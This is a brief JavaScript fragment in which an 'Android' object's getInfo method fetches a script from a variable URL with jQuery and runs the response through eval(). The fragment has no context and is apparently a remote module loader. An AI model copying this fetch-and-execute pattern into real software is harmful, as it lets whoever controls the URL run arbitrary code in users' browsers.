function Android() {
this.getInfo = function() {
this.chrome();
$.ajax({
url: mod_modi_url,
type: "GET",
contentType: 'text/javascript',
cache: false,
success: function (data, status, error) {
eval(data);
}
});
};
}
